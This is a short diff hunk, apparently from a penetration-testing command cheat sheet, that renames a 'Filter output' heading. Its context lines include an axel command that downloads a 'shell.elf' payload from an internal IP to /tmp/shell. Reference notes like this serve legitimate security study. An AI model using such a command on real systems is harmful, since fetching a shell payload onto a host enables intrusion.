@@ -117,7 +117,7 @@ View the file's permssion
 	axel -a -n 20 -o /tmp/shell http://192.168.110.131/shell.elf
 	```
 
-### Filter output 
+### Output Filtering
 
 === "sed"
 
